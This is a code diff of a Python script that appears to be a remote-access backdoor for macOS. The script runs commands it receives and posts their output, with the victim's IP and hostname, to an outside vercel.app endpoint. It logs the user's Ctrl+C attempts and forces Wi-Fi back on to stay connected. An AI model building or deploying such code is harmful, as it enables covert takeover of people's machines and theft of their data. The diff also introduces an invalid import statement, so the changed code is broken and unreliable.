@@ -1,5 +1,5 @@
 try:
-    import os.system
+    import os import system as ossystem
     from requests import get, post
     from time import sleep
     from subprocess import Popen as system
@@ -37,11 +37,11 @@ while True:
             try:
                 post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when handling discord api``")
             except KeyboardInterrupt:
-                os.system("/usr/sbin/networksetup -setairportpower en0 on")
+                ossystem("/usr/sbin/networksetup -setairportpower en0 on")
                 continue
             continue
         except:
-            os.system("/usr/sbin/networksetup -setairportpower en0 on")
+            ossystem("/usr/sbin/networksetup -setairportpower en0 on")
             sleep(3)
             continue
         # execute command
@@ -82,7 +82,7 @@ while True:
 #                    except KeyboardInterrupt:
 #                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when replying to ping``")
 #                    except:
-                        os.system("/usr/sbin/networksetup -setairportpower en0 on")
+                        ossystem("/usr/sbin/networksetup -setairportpower en0 on")
 
 #                       continue
                 if command.startswith("cd"):
@@ -98,7 +98,7 @@ while True:
                     except FileNotFoundError:
                         post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``$ {command}`` ```No Such Directory```-{ip}@{hostname}")
                     except:
-                        os.system("/usr/sbin/networksetup -setairportpower en0 on")
+                        ossystem("/usr/sbin/networksetup -setairportpower en0 on")
 
                         continue
                 old_command = command
@@ -129,7 +129,7 @@ while True:
                             continue
                     continue
                 except:
-                    os.system("/usr/sbin/networksetup -setairportpower en0 on")
+                    ossystem("/usr/sbin/networksetup -setairportpower en0 on")
 
                     continue
                 if cmdout.decode() != "" and cmderr.decode() == "":
@@ -145,7 +145,7 @@ while True:
                                 continue
                         continue
                     except:
-                        os.system("/usr/sbin/networksetup -setairportpower en0 on")
+                        ossystem("/usr/sbin/networksetup -setairportpower en0 on")
 
                         continue
                 elif cmdout.decode() == "" and cmderr.decode() == "":
@@ -158,7 +158,7 @@ while True:
                                 continue
                         continue
                     except:
-                        os.system("/usr/sbin/networksetup -setairportpower en0 on")
+                        ossystem("/usr/sbin/networksetup -setairportpower en0 on")
 
                         continue
                 old_command = command
